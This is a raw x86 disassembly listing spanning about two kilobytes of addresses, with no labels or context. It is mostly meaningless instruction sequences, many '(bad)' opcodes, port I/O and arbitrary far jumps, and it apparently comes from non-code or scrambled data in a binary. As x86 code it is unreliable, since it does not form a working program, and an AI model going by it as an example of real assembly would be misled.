  4112a7:	int    0xc8
  4112a9:	out    0xb2,al
  4112ab:	test   ebx,0xbbd4f2be
  4112b1:	in     al,dx
  4112b2:	sti    
  4112b3:	in     eax,dx
  4112b4:	lock jecxz 0x411291
  4112b7:	call   ecx
  4112b9:	ret    
  4112ba:	(bad)  
  4112bc:	cli    
  4112bd:	(bad)  
  4112be:	fnsetpm(287 only) 
  4112c0:	add    bh,BYTE PTR [eax-0x1b4e1632]
  4112c6:	shl    ah,1
  4112c8:	rol    cl,1
  4112ca:	iret   
  4112cb:	les    ebp,FWORD PTR [eax+ebp*8-0x16024348]
  4112d2:	mov    esp,0xf805e6c1
  4112d7:	xlat   BYTE PTR ds:[ebx]
  4112d8:	in     eax,0xc6
  4112da:	in     al,0xc4
  4112dc:	push   es
  4112dd:	pop    es
  4112de:	jecxz  0x4112d9
  4112e0:	dec    ah
  4112e2:	mov    bl,0xb0
  4112e4:	mov    dh,0xc6
  4112e7:	out    dx,al
  4112e8:	(bad)  
  4112e9:	shr    ebp,1
  4112eb:	vpaddusw xmm6,xmm6,XMMWORD PTR [edx+edi*4-0x18022b33]
  4112f4:	mov    eax,0xf7d400e1
  4112f9:	rcl    edi,1
  4112fb:	mul    eax
  4112fd:	(bad)  
  4112fe:	cld    
  4112ff:	in     eax,0xe0
  411301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411302:	rcr    esp,0xe6
  411305:	iret   
  411306:	fcmovnb st,st(3)
  411308:	mov    cl,0xe4
  41130a:	shl    DWORD PTR [esi-0x15164b4c],cl
  411310:	into   
  411311:	(bad)  
  411312:	cld    
  411313:	cld    
  411314:	xlat   BYTE PTR ds:[ebx]
  411315:	ret    0xe707
  411318:	icebp  
  411319:	(bad)  
  41131b:	or     al,BYTE PTR [edi]
  41131d:	or     al,0xe0
  41131f:	jmp    0xacff0304
  411324:	fstp   st(5)
  411326:	mov    ah,0xc2
  411328:	retf   0xffe7
  41132b:	mov    bh,0xc4
  41132d:	xlat   BYTE PTR ds:[ebx]
  41132e:	mov    dh,0xbb
  411330:	jmp    0x7bb:0xe307f3c8
  411337:	hlt    
  411338:	sti    
  411339:	loope  0x411318
  41133b:	jecxz  0x411304
  41133d:	sti    
  41133e:	jecxz  0x41131e
  411340:	iret   
  411341:	ret    
  411342:	xlat   BYTE PTR ds:[ebx]
  411343:	bnd jmp 0xfbf1c11f
  411349:	loope  0x4112fd
  41134b:	int    0xd8
  41134d:	retf   0xd5d6
  411350:	(bad)  
  411352:	imul   dh
  411354:	std    
  411355:	loope  0x411358
  411357:	(bad)
  41135a:	add    al,dh
  41135c:	or     bl,ah
  41135e:	push   cs
  41135f:	retf   
  411360:	retf   0xf0ce
  411363:	leave  
  411364:	rcl    esp,1
  411366:	into   
  411367:	lock mov ch,0xf6
  41136a:	(bad)  
  41136b:	fcom   st(5)
  41136d:	jmp    0xb9f8:0xfcddf7d4
  411374:	stc    
  411375:	in     eax,dx
  411376:	shl    ecx,cl
  411378:	aam    0xc3
  41137a:	(bad)  
  41137c:	aam    0xe
  41137e:	(bad)  
  41137f:	std    
  411380:	shr    BYTE PTR [ecx-0xc481035],0xd5
  411387:	ret    
  411388:	out    0xcc,al
  41138a:	sti    
  41138b:	repz mov ebx,0xd6b5fdd9
  411391:	out    dx,eax
  411392:	cld    
  411393:	mov    edi,0xfcc2dabd
  411398:	fsubrp st(3),st
  41139a:	cmc    
  41139b:	syscall 
  41139d:	fcmovnu st,st(0)
  41139f:	stc    
  4113a0:	std    
  4113a1:	in     al,dx
  4113a2:	(bad)
  4113a5:	iret   
  4113a6:	enter  0xc2ea,0xb1
  4113aa:	in     eax,0xe5
  4113ac:	out    dx,al
  4113ad:	mov    bh,0xde
  4113af:	imul   edx
  4113b1:	fst    st(5)
  4113b3:	mov    ecx,0xffbebcff
  4113b8:	add    ch,dl
  4113ba:	(bad)  
  4113bc:	stc    
  4113bd:	loop   0x411383
  4113bf:	les    ecx,FWORD PTR [eax]
  4113c1:	lods   al,BYTE PTR ds:[esi]
  4113c2:	icebp  
  4113c3:	shl    ebx,1
  4113c5:	ret    
  4113c6:	fnclex 
  4113c8:	mov    esi,0xf6d8b7b1
  4113ce:	out    dx,eax
  4113cf:	add    edi,edi
  4113d1:	dec    al
  4113d3:	(bad)  
  4113d5:	int    0xf6
  4113d7:	hlt    
  4113d8:	(bad)  
  4113da:	out    0xd6,eax
  4113dc:	fadd   QWORD PTR [ebx]
  4113de:	les    ecx,FWORD PTR [ecx]
  4113e0:	or     eax,0xf7cbcee1
  4113e5:	out    dx,eax
  4113e6:	out    0xcb,eax
  4113e8:	loope  0x4113d3
  4113ea:	mov    ebx,0xcec5f4fe
  4113ef:	fscale 
  4113f1:	mov    ebx,0xfff1f9d8
  4113f6:	mov    BYTE PTR [edx+esi*8],0xc5
  4113fa:	std    
  4113fb:	add    al,0xc9
  4113fd:	aad    0xec
  4113ff:	in     eax,0x6
  411401:	(bad)  
  411402:	jmp    0xd021f9d3
  411407:	(bad)  [eax-0x37162f47]
  41140d:	mov    ecx,0xd0dcfaba
  411412:	add    bl,al
  411414:	test   BYTE PTR [ecx],0xe7
  411417:	fsubrp st(0),st
  411419:	fimul  WORD PTR [edx]
  41141b:	add    eax,0xe2db0a01
  411420:	(bad)  
  411422:	out    dx,eax
  411423:	int3   
  411424:	not    ebx
  411426:	div    DWORD PTR [edi-0x4b1f0913]
  41142c:	retf   
  41142d:	lds    edi,FWORD PTR [edi-0x41462403]
  411433:	out    0xc1,eax
  411435:	rcl    esi,0xc6
  411438:	retf   
  411439:	(bad)  
  41143a:	fcmovnbe st,st(7)
  41143c:	clc    
  41143d:	add    eax,0xd2facacc
  411442:	mov    al,0xde
  411444:	test   dl,0xf3
  411447:	fcmove st,st(1)
  411449:	mov    ch,0xce
  41144b:	rcr    ebp,cl
  41144d:	retf   
  41144e:	mov    dl,0xcc
  411450:	sar    BYTE PTR [eax-0xf25fc41],cl
  411456:	mov    esp,0x5dbf2f3
  41145b:	fld    QWORD PTR [eax]
  41145d:	pop    es
  41145e:	aam    0xcf
  411460:	iret   
  411461:	(bad)  
  411462:	mov    al,0xf3
  411464:	mov    bl,0xcc
  411466:	(bad)  
  411467:	mov    dl,0xe4
  411469:	(bad)  
  41146a:	les    edi,FWORD PTR [ecx-0x26163a13]
  411470:	mov    ebp,0xbeefecc3
  411475:	repz mov esp,0xdcf6c1fd
  41147b:	retf   
  41147c:	std    
  41147d:	out    dx,al
  41147e:	add    cl,BYTE PTR [esi+ebx*8]
  411481:	enter  0xf6c1,0xc4
  411485:	lods   al,BYTE PTR ds:[esi]
  411486:	aam    0xbb
  411488:	in     al,dx
  411489:	aad    0xd4
  41148b:	lods   eax,DWORD PTR ds:[esi]
  41148c:	icebp  
  41148d:	(bad)  
  41148e:	fdiv   QWORD PTR [ecx-0xe2031]
  411494:	loopne 0x41147c
  411496:	fdivp  st(6),st
  411498:	rcl    al,cl
  41149a:	loop   0x4114a2
  41149c:	hlt    
  41149d:	jmp    0xf2bd:0xd1dd0b13
  4114a4:	in     eax,dx
  4114a5:	enter  0xcec1,0xee
  4114a9:	fcmovbe st,st(0)
  4114ab:	mov    ch,0xfe
  4114ad:	in     al,dx
  4114ae:	icebp  
  4114af:	jmp    0x411488
  4114b1:	repz clc 
  4114b3:	mov    eax,0x305bcdb
  4114b8:	in     eax,0xfb
  4114ba:	ftst   
  4114bc:	stc    
  4114bd:	fadd   QWORD PTR [eax]
  4114bf:	jmp    0xd733f4a5
  4114c4:	ret    
  4114c5:	in     al,0xd6
  4114c7:	loopne 0x41149b
  4114c9:	(bad)  
  4114ca:	stc    
  4114cb:	out    0xea,al
  4114cd:	call   esp
  4114cf:	mov    ecx,0xf0f4d7b9
  4114d4:	add    dh,al
  4114d6:	add    eax,DWORD PTR [esi]
  4114d8:	out    0xf4,eax
  4114da:	shl    bl,0xbc
  4114dd:	call   DWORD PTR [ebx]
  4114df:	in     eax,0xc0
  4114e1:	test   eax,0xe4c5aec1
  4114e6:	out    dx,al
  4114e7:	repz shl ecx,0xd9
  4114eb:	cli    
  4114ec:	mov    edx,0xdde3f0e5
  4114f1:	neg    ebx
  4114f3:	loopne 0x4114c1
  4114f5:	ftst   
  4114f7:	aad    0xd6
  4114f9:	mov    DWORD PTR [ecx+ebp*8],0xf9cac4d4
  411500:	jmp    0xf73001d1
  411505:	rcl    edx,0xcc
  411508:	mov    dh,0xc4
  41150a:	jmp    0x4114d2
  41150c:	in     eax,0xc4
  41150e:	mov    dh,0xfa
  411510:	mov    esi,0x1bec2d9
  411515:	std    
  411516:	out    0xf4,al
  411518:	stc    
  411519:	std    
  41151a:	(bad)  
  41151b:	in     al,0x7
  41151d:	int    0xf4
  41151f:	iret   
  411520:	jmp    ebp
  411522:	les    ebp,FWORD PTR [edi+ebp*4-0x4c354312]
  411529:	retf   0xd7e4
  41152c:	mov    eax,0xe8b9dfba
  411531:	int    0xd8
  411533:	ror    ch,1
  411535:	aam    0xc7
  411537:	mov    ecx,0xffcbf909
  41153c:	add    bh,bh
  41153e:	push   cs
  41153f:	sti    
  411540:	jmp    0xf5fef3ef
  411545:	hlt    
  411546:	int    0xe5
  411548:	loopne 0x41152e
  41154a:	aad    0xd7
  41154c:	lods   al,BYTE PTR ds:[esi]
  41154d:	(bad)  
  41154e:	mov    edx,0xbf01caf1
  411553:	rol    dh,1
  411555:	stc    
  411556:	idiv   ebp
  411558:	add    al,bh
  41155a:	fadd   QWORD PTR [eax]
  41155c:	hlt    
  41155d:	push   cs
  41155e:	std    
  41155f:	(bad)  
  411560:	fsubr  QWORD PTR [esp+eax*8-0x173e4f53]
  411567:	jmp    0x41152e
  411569:	retf   0xeffb
  41156c:	repz fcmovne st,st(7)
  41156f:	(bad)  
  411571:	call   0xc023e947
  411576:	idiv   dh
  411578:	fdivp  st(0),st
  41157a:	or     al,ah
  41157c:	in     al,0x2
  41157e:	(bad)  
  41157f:	fadd   DWORD PTR [esi]
  411581:	mov    ebp,0xb0afc1c5
  411586:	out    0xc2,eax
  411588:	out    0xc1,al
  41158a:	hlt    
  41158b:	imul   dh
  41158d:	(bad)  
  41158e:	call   0xc024055b
  411593:	loope  0x41158d
  411595:	loope  0x41159a
  411597:	cmc    
  411598:	cmc    
  411599:	clc    
  41159a:	(bad)
  41159d:	(bad)  
  41159f:	loopne 0x4115aa
  4115a1:	in     al,dx
  4115a2:	test   eax,0xc5b7f3d1
  4115a7:	loopne 0x411563
  4115a9:	aad    0xcf
  4115ab:	(bad)  
  4115ac:	(bad)  
  4115ae:	mov    dh,0xbd
  4115b0:	jmp    0xd6da:0xfec3bfbd
  4115b7:	(bad)  
  4115b9:	stc    
  4115ba:	jmp    0xdfc9:0xdf5d6bd
  4115c1:	test   eax,0xd3f2c9b3
  4115c6:	into   
  4115c7:	hlt    
  4115c8:	icebp  
  4115c9:	(bad)  
  4115ca:	in     eax,0xd4
  4115cc:	enter  0xd4e8,0xbd
  4115d0:	jmp    0xf6:0xf5d4b6cf
  4115d7:	jmp    0x4115dd
  4115d9:	ret    0x1be
  4115dc:	or     ebx,ebx
  4115de:	jmp    0x4115e4
  4115e0:	or     al,0xbe
  4115e2:	lods   al,BYTE PTR ds:[esi]
  4115e3:	(bad)
  4115e6:	into   
  4115e7:	mov    al,0xe9
  4115e9:	mov    al,0xb8
  4115eb:	enter  0xd0c6,0xd6
  4115ef:	icebp  
  4115f0:	add    bh,ah
  4115f2:	add    edx,ebp
  4115f4:	ret    0xf006
  4115f7:	push   es
  4115f8:	(bad)  
  4115fa:	(bad)  
  4115fc:	clc    
  4115fd:	or     eax,0xeffcc4c2
  411602:	ret    
  411603:	repnz into 
  411605:	hlt    
  411606:	into   
  411607:	loopne 0x4115cd
  411609:	mov    bh,0xf3
  41160b:	in     eax,0xe4
  41160d:	repz int 0xf0
  411610:	shl    edx,1
  411612:	cli    
  411613:	mov    ecx,0xd5d7cd06
  411618:	lock jmp edi
  41161b:	jmp    0x4115f2
  41161d:	aad    0xd8
  41161f:	dec    ebp
  411621:	repnz in al,0xcf
  411624:	out    dx,eax
  411625:	call   0xf526db13
  41162a:	fcom   st(4)
  41162c:	clc    
  41162d:	sti    
  41162e:	mov    ebp,0xcf01d4bf
  411633:	fsubrp st(5),st
  411635:	in     eax,dx
  411636:	frndint 
  411638:	(bad)  
  411639:	cmc    
  41163a:	neg    dh
  41163c:	retf   0xd4
  41163f:	adc    eax,DWORD PTR [esi]
  411641:	loope  0x411612
  411643:	out    0xed,al
  411645:	aad    0xf7
  411647:	shl    bh,cl
  411649:	mov    ah,0xe7
  41164b:	sar    eax,1
  41164d:	repnz std 
  41164f:	sar    BYTE PTR [ebx-0xf062203],1
  411655:	(bad)  
  411656:	add    esi,edi
  411658:	stc    
  411659:	or     eax,DWORD PTR [eax]
  41165b:	std    
  41165c:	hlt    
  41165d:	add    eax,0xb1dc05e7
  411662:	mov    cl,0xd6
  411664:	shr    ebx,0xf6
  411667:	cli    
  411668:	out    0xce,al
  41166a:	xbegin 0x317cf34
  411670:	idiv   BYTE PTR [eax-0x7383333]
  411676:	loopne 0x411656
  411678:	fmul   QWORD PTR [eax]
  41167a:	fxch   st(3)
  41167c:	mov    esp,0x1cae20c
  411681:	loope  0x411649
  411683:	jecxz  0x411650
  411685:	out    dx,eax
  411686:	loopne 0x411638
  411688:	ror    dl,1
  41168a:	sar    DWORD PTR [edi-0x140f0634],1
  411690:	in     eax,dx
  411691:	(bad)  
  411692:	fld    DWORD PTR [eax]
  411694:	in     al,dx
  411695:	mov    edi,0xfc03d4c5
  41169a:	hlt    
  41169b:	or     dh,ah
  41169d:	dec    bl
  41169f:	loope  0x41168f
  4116a1:	sar    DWORD PTR [ebp-0x11351351],0xb0
  4116a8:	(bad)  
  4116a9:	in     eax,dx
  4116aa:	mov    cl,0xd6
  4116ac:	shr    dl,1
  4116ae:	call   0xe43edaab
  4116b3:	loope  0x411697
  4116b5:	ret    
  4116b6:	fiadd  WORD PTR [ecx]
  4116b8:	rol    al,0xbe
  4116bb:	(bad)  
  4116bc:	fldpi  
  4116be:	call   0xe03417ab
  4116c3:	fcomip st,st(3)
  4116c5:	aam    0xe1
  4116c7:	cli    
  4116c8:	mov    bl,0xee
  4116ca:	mov    ecx,0xecf4e8ee
  4116cf:	lock leave 
  4116d1:	mov    edx,0xdff3fcf7
  4116d6:	add    al,0xf9
  4116d8:	jmp    0xe948e2b3
  4116dd:	in     eax,dx
  4116de:	int3   
  4116df:	or     eax,0xcca6e4c8
  4116e4:	(bad)  
  4116e5:	mov    ch,0xb5
  4116e7:	in     eax,0xc7
  4116e9:	mov    bh,0xd7
  4116eb:	aam    0xed
  4116ed:	mov    bl,0xf1
  4116ef:	mov    edx,0xef03ccc3
  4116f4:	mov    ah,0xfa
  4116f6:	fmulp  st(3),st
  4116f8:	clc    
  4116f9:	push   es
  4116fa:	cli    
  4116fb:	add    eax,0xea00cdc6
  411700:	dec    eax
  411702:	shr    dl,1
  411704:	(bad)  
  411705:	shl    esi,1
  411707:	shl    ah,1
  411709:	clc    
  41170a:	in     eax,0xd4
  41170c:	fprem  
  41170e:	aam    0xd1
  411710:	int3   
  411711:	sar    DWORD PTR [edi-0x73e222f],0xc1
  411718:	or     edi,edx
  41171a:	inc    ecx
  41171c:	fxch   st(1)
  41171e:	loop   0x411722
  411720:	or     eax,0xebc2bfab
  411725:	shl    dh,cl
  411727:	shl    BYTE PTR [esi-0x2f2a4d0d],cl
  41172d:	hlt    
  41172e:	std    
  41172f:	iret   
  411730:	neg    bl
  411732:	test   dl,0xdc
  411735:	add    al,0xf9
  411737:	add    esi,eax
  411739:	or     BYTE PTR [eax],al
  41173b:	cli    
  41173c:	(bad)  
  41173e:	enter  0xede,0xbc
  411742:	rcl    edx,0xcc
  411745:	lods   al,BYTE PTR ds:[esi]
  411746:	shl    BYTE PTR [ebx-0x34095036],1
  41174c:	(bad)  
  41174d:	in     eax,dx
  41174e:	mov    edx,0xddd5dec9
  411753:	mov    DWORD PTR [ebx],0xf9c3d2e7
  411759:	push   es
  41175a:	or     ecx,eax
  41175c:	cld    
  41175d:	(bad)  
  41175e:	or     al,0xd
  411760:	shr    BYTE PTR [ebx-0x22311652],0xc9
  411767:	in     eax,0xe6
  411769:	sti    
  41176a:	mov    bh,0xb1
  41176c:	leave  
  41176d:	repnz out dx,al
  41176f:	enter  0xfc02,0xf0
  411773:	aad    0xd7
  411775:	add    dh,dl
  411777:	jmp    0x411784
  411779:	icebp  
  41177a:	or     eax,ecx
  41177c:	(bad)  
  41177d:	fucomi st,st(2)
  41177f:	or     ebx,esp
  411781:	mov    esp,0xeaeabde3
  411786:	out    0xbb,al
  411788:	test   al,0xec
  41178b:	mov    al,0xf9
  41178d:	jmp    0xd500:0xdad0dbca
  411794:	rcr    esp,1
  411796:	fnstsw ax
  411798:	in     eax,0xcb
  41179a:	or     eax,ecx
  41179c:	out    0xc7,al
  41179e:	in     al,dx
  41179f:	jmp    0x4117aa
  4117a1:	out    dx,al
  4117a2:	(bad)  
  4117a4:	scas   al,BYTE PTR es:[edi]
  4117a5:	repnz lods al,BYTE PTR ds:[esi]
  4117a7:	aad    0xc6
  4117a9:	call   0xcdffff74
  4117ae:	retf   0xf0f7
  4117b1:	jecxz  0x4117a9
  4117b3:	into   
  4117b4:	cli    
  4117b5:	add    al,dl
  4117b7:	fdivr  QWORD PTR [ebx+ebp*8+0x6eac4be]
  4117be:	fsubr  st,st(2)
  4117c0:	add    dl,bl
  4117c2:	in     al,dx
  4117c3:	loop   0x4117af
  4117c5:	mov    dh,0xbc
  4117c7:	mov    al,0xf4
  4117c9:	out    dx,eax
  4117ca:	in     al,0xf3
  4117cc:	clc    
  4117cd:	cld    
  4117ce:	rcr    edx,cl
  4117d0:	cli    
  4117d1:	add    esp,ecx
  4117d3:	into   
  4117d4:	(bad)  
  4117d6:	sar    BYTE PTR [ecx-0xf83f22],1
  4117dc:	fucomi st,st(3)
  4117de:	loope  0x4117ce
  4117e0:	std    
  4117e1:	fidiv  WORD PTR [ebx-0x43281b4f]
  4117e7:	mov    ah,0xf6
  4117e9:	rcr    ebx,0xf0
  4117ec:	in     eax,dx
  4117ed:	retf   0xfaf6
  4117f0:	mov    ecx,0xf3c7c1d0
  4117f5:	sar    BYTE PTR [esi+0xae307eb],cl
  4117fb:	psubw  mm5,mm0
  4117fe:	leave  
  4117ff:	add    bh,cl
  411801:	retf   
  411802:	ret    0xc2bf
  411805:	int    0xca
  411807:	sti    
  411808:	cli    
  411809:	mov    dl,0xc4
  41180b:	(bad)  
  41180c:	cli    
  41180d:	(bad)  
  41180f:	mov    eax,0xbef4bef0
  411814:	stc    
  411815:	sti    
  411816:	cld    
  411817:	idiv   ch
  411819:	fcmovnb st,st(7)
  41181b:	push   cs
  41181c:	fsubr  st(4),st
  41181e:	add    eax,0xc3addee9
  411823:	out    0xae,al
  411825:	mov    dh,0xf6
  411827:	(bad)
  41182a:	repz repnz out 0xd9,al
  41182e:	aad    0xf4
  411830:	call   0xfa1fd30f
  411835:	mov    ebx,0x5dcc3d7
  41183a:	inc    BYTE PTR [edi]
  41183c:	hlt    
  41183d:	iret   
  41183e:	push   cs
  41183f:	loopne 0x41183b
  411841:	out    dx,al
  411842:	icebp  
  411843:	(bad)  
  411844:	out    0xdd,eax
  411846:	aad    0xf5
  411848:	mov    cl,0xfb
  41184a:	mov    dh,0xdb
  41184c:	mov    edi,0xc8c3bdb9
  411851:	loopne 0x411832
  411853:	int    0xed
  411855:	add    edx,eax
  411857:	push   es
  411858:	fcomp  st(7)
  41185a:	jecxz  0x411857
  41185c:	mul    bh
  41185e:	fadd   DWORD PTR [esi]
  411860:	(bad)  [ebp-0x84c4224]
  411866:	fdiv   QWORD PTR [edx-0x3146324a]
  41186c:	(bad)  
  41186d:	std    
  41186e:	enter  0xb4b8,0xbd
  411872:	ret    
  411873:	out    0xed,eax
  411875:	int3   
  411876:	(bad)  
  411877:	fst    st(2)
  411879:	not    esp
  41187b:	stc    
  41187c:	add    dl,ah
  41187e:	int    0xce
  411880:	repnz (bad) 
  411883:	fsubp  st(2),st
  411885:	loop   0x411854
  411887:	in     eax,0xe9
  411889:	mov    dh,0xf8
  41188b:	aad    0xbf
  41188d:	shr    ch,cl
  41188f:	test   al,0xbc
  411892:	fxtract 
  411894:	shr    esp,0xd1
  411897:	jmp    0x104:0xe6c8f7d8
  41189e:	loop   0x4118a1
  4118a0:	out    0xdc,al
  4118a2:	mov    edi,0xebb5a8be
  4118a7:	sar    DWORD PTR [edx-0x3a184a1a],0xbe
  4118ae:	not    eax
  4118b0:	rcr    ecx,1
  4118b2:	shl    ecx,0xb4
  4118b5:	rol    DWORD PTR [ecx],cl
  4118b7:	(bad)
  4118ba:	jmp    0xfae1:0xfadee403
  4118c1:	leave  
  4118c2:	(bad)  
  4118c4:	enter  0xfbe6,0xc3
  4118c8:	aam    0xc5
  4118ca:	fcmovnbe st,st(5)
  4118cc:	rol    ch,1
  4118ce:	jmp    0x4118a6
  4118d0:	std    
  4118d1:	test   BYTE PTR [eax],0xdd
  4118d4:	in     al,dx
  4118d5:	mov    edi,0xf4c0e4d7
  4118da:	add    dh,ch
  4118dc:	(bad)  
  4118dd:	retf   
  4118de:	fucomp st(3)
  4118e0:	repz int 0xb2
  4118e3:	mov    ecx,0xf1c9efc7
  4118e9:	in     eax,dx
  4118ea:	vpand  ymm5,ymm7,ymm1
  4118ee:	cld    
  4118ef:	call   0xda1ff0cc
  4118f4:	int3   
  4118f5:	add    eax,0xe8da0bc6
  4118fa:	fcmovnb st,st(7)
  4118fc:	(bad)  
  4118fd:	fadd   st(4),st
  4118ff:	add    ch,al
  411901:	scas   al,BYTE PTR es:[edi]
  411902:	mov    dl,0xde
  411904:	repnz mov ebp,0xcacecfee
  41190a:	out    0xbf,al
  41190c:	(bad)  
  41190d:	fsub   st(7),st
  41190f:	(bad)  
  411910:	(bad)  
  411912:	repz mov ebp,0xe505fbfa
  411918:	aam    0xe9
  41191a:	(bad)  
  41191c:	into   
  41191d:	(bad)  
  41191f:	in     eax,dx
  411920:	or     cl,dh
  411922:	test   al,0xc7
  411924:	fmul   st(4),st
  411926:	lods   al,BYTE PTR ds:[esi]
  411927:	ret    0xedd2
  41192a:	frstpm(287 only) 
  41192c:	std    
  41192d:	mov    ecx,0xba01d2b6
  411932:	mov    eax,0xf0dfd3e0
  411937:	icebp  
  411938:	push   es
  411939:	stc    
  41193a:	sti    
  41193b:	or     DWORD PTR [eax],ecx
  41193d:	loop   0x411901
  41193f:	push   es
  411940:	or     ah,dl
  411942:	repz fsub st(4),st
  411945:	cmc    
  411946:	out    dx,al
  411947:	into   
  411948:	repz jmp 0xf02cd246
  41194e:	mov    dh,0xd0
  411950:	out    dx,eax
  411951:	clc    
  411952:	ret    0xd6f4
  411955:	add    al,0xe7
  411957:	aad    0xff
  411959:	add    al,0xe7
  41195b:	fld    DWORD PTR [edx]
  41195d:	fcomp  st(0)
  41195f:	rcl    edx,0xcc
  411962:	mov    edi,0xeaddbdf2
  411967:	loop   0x411944
  411969:	(bad)  
  41196a:	retf   0xf1fa
  41196d:	jmp    0xf2d4:0xf0b8deb9
  411974:	fst    st(0)
  411976:	lock add DWORD PTR [ebx],ecx
  411979:	fdivrp st(5),st
  41197b:	(bad)  
  41197c:	cli    
  41197d:	add    BYTE PTR [eax],cl
  41197f:	leave  
  411980:	loope  0x41193b
  411982:	lock out dx,eax
  411984:	ror    ebp,1
  411986:	leave  
  411987:	mov    dl,0xe4
  411989:	hlt    
  41198a:	leave  
  41198b:	xlat   BYTE PTR ds:[ebx]
  41198c:	fcmovne st,st(3)
  41198e:	mov    ebp,0xc2ecda
  411993:	in     al,dx
  411994:	sar    eax,cl
  411996:	ffreep st(7)
  411998:	test   ecx,0xc3f8f9c7
  41199e:	iret   
  41199f:	std    
  4119a0:	repnz (bad) 
  4119a2:	int3   
  4119a3:	mov    edi,0xcbb4adb7
  4119a8:	hlt    
  4119a9:	sti    
  4119aa:	in     eax,dx
  4119ab:	mov    edi,0xbff7f4c6
  4119b0:	int3   
  4119b1:	jecxz  0x411989
  4119b3:	repz ret 
  4119b5:	add    al,0x0
  4119b7:	ret    0xf1e2
  4119ba:	or     DWORD PTR [ecx],ecx
  4119bc:	loopne 0x4119bc
  4119be:	aam    0xf3
  4119c0:	int3   
  4119c1:	jecxz  0x4119b6
  4119c3:	mov    ebp,0xadc8bdca
  4119c8:	(bad)  
  4119ca:	(bad)
  4119cd:	mov    ebx,0xf7f3fdbe
  4119d2:	fsincos 
  4119d4:	out    0xd3,eax
  4119d6:	lock push es
  4119d8:	clc    
  4119d9:	out    0x4,eax
  4119db:	fprem1 
  4119dd:	out    dx,al
  4119de:	add    al,0x5
  4119e0:	jmp    0xeb000dcd
  4119e5:	ret    
  4119e6:	lock rol ecx,1
  4119e9:	mov    ah,0xef
  4119eb:	retf   0xb4fe
  4119ee:	fsubr  st(2),st
  4119f0:	in     al,dx
  4119f1:	iret   
  4119f2:	rol    eax,cl
  4119f4:	fcmovbe st,st(6)
  4119f6:	add    al,0xda
  4119f8:	std    
  4119f9:	out    0xf4,eax
  4119fb:	jmp    0x926de00
  411a00:	(bad)  
  411a02:	jmp    0xc2f7e4c9
  411a07:	lock enter 0xd8d5,0xd8
  411a0c:	(bad)  
  411a0e:	(bad)  
  411a0f:	(bad)  
  411a11:	into   
  411a12:	int    0xb5
  411a14:	cli    
  411a15:	add    al,bl
  411a17:	in     al,0xd2
  411a19:	or     ch,bh
  411a1b:	(bad)  
  411a1d:	(bad)
  411a21:	fmulp  st(4),st
  411a23:	retf   
  411a24:	rol    esp,0xd2
  411a27:	icebp  
  411a28:	out    dx,eax
  411a29:	iret   
  411a2a:	in     eax,0xe9
  411a2c:	std    
  411a2d:	in     eax,0xd8
  411a2f:	mov    esp,0xecddfada
  411a34:	int    0x3
  411a36:	fisttp WORD PTR [edx]
  411a38:	or     ecx,DWORD PTR [ecx]
  411a3a:	fild   DWORD PTR [edx]
  411a3c:	(bad)  
  411a3e:	push   es
  411a3f:	or     esp,ebp
  411a41:	shl    esi,cl
  411a43:	into   
  411a44:	les    edi,FWORD PTR [ebp-0x84f1949]
  411a4a:	(bad)  
  411a4b:	xlat   BYTE PTR ds:[ebx]
  411a4c:	shl    edi,cl
  411a4e:	fmul   st,st(7)
  411a50:	fld    DWORD PTR [ecx]
  411a52:	loop   0x411a12
  411a54:	fcmovbe st,st(0)
  411a56:	mul    ebx
  411a58:	jmp    0x411a4e
  411a5a:	loopne 0x411a35
  411a5c:	cld    
  411a5d:	jmp    0xc22bf76e
  411a62:	lock ret 
  411a64:	loop   0x411a1c
  411a66:	in     eax,0xa9
  411a68:	enter  0xf8f1,0xb9
  411a6c:	(bad)  
  411a6d:	aad    0xd9
  411a6f:	call   0xc42e1649
  411a74:	fcmove st,st(4)
  411a76:	ret    
  411a77:	cld    
  411a78:	fimul  WORD PTR [ecx]
  411a7a:	add    esp,eax
  411a7c:	inc    BYTE PTR [ecx]
  411a7e:	fucom  st(4)
  411a80:	or     ecx,ebx
  411a82:	iret   
  411a83:	repnz test al,0xd3
  411a86:	lock lods eax,DWORD PTR ds:[esi]
  411a88:	stc    
  411a89:	(bad)  
  411a8a:	fcomi  st,st(2)
  411a8c:	mov    al,0xd4
  411a8e:	repz lock leave 
  411a91:	stc    
  411a92:	sar    edi,1
  411a94:	out    0x7,eax
  411a96:	fdivr  st,st(5)
  411a98:	std    
  411a99:	add    dh,ah
  411a9b:	out    dx,al
  411a9c:	into   
  411a9d:	clc    
  411a9e:	(bad)  
  411a9f:	out    dx,eax
  411aa0:	or     ebp,DWORD PTR [eax+ebx*8-0x4c17194e]
  411aa7:	aad    0xb0
  411aa9:	mov    bh,0xf6
  411aab:	(bad)  
  411aac:	out    dx,al
  411aad:	hlt    
  411aae:	hlt    
  411aaf:	test   bh,0xcc
  411ab2:	aam    0xf7
  411ab4:	repz aam 0xde
  411ab7:	shl    al,1
  411ab9:	aad    0xfa
  411abb:	out    dx,al
  411abc:	fiadd  DWORD PTR [esi+ecx*1]
  411abf:	adc    ecx,ebx
  411ac1:	out    dx,eax
  411ac2:	stos   BYTE PTR es:[edi],al
  411ac3:	int3   
  411ac4:	test   al,0xd1
  411ac6:	out    0xb4,al
  411ac8:	mov    dl,0xcc
  411aca:	mov    bh,0xb9
  411acc:	lods   al,BYTE PTR ds:[esi]
  411acd:	mov    ebx,0xb9f6f9c9
  411ad2:	out    dx,eax
  411ad3:	fsubrp st(3),st
  411ad5:	in     eax,dx
  411ad6:	rol    BYTE PTR [edx],cl
  411ad8:	xabort 0xca
  411adb:	in     eax,0x5
  411add:	or     dl,BYTE PTR [ebx]
  411adf:	int3   
  411ae0:	add    bh,bl
  411ae2:	int    0xe5
  411ae4:	iret   
  411ae5:	mov    dl,0xc9
  411ae7:	loopne 0x411aba
  411ae9:	fcmove st,st(5)
  411aeb:	iret   
  411aec:	(bad)  
  411aed:	call   eax
  411aef:	shr    bh,cl
  411af1:	ret    0xcdc3
  411af4:	rcl    edx,1
  411af6:	loopne 0x411afa
  411af8:	out    0xe5,eax
  411afa:	fucomip st,st(0)
  411afc:	aam    0xea
  411afe:	add    bl,dl
  411b00:	ffreep st(6)
  411b02:	in     eax,0xf2
  411b04:	(bad)  
  411b05:	jmp    0xf0eb:0xc5b7e5ee
  411b0c:	int    0xf4
  411b0e:	mov    dl,0xb1
  411b10:	mov    al,0xd4
  411b12:	in     al,dx
  411b13:	fidivr DWORD PTR [eax+0x1d4f3c3]
  411b19:	idiv   esp
  411b1b:	push   cs
  411b1c:	or     ebx,esp
  411b1e:	loopne 0x411ae8
  411b20:	ud1    eax,edx
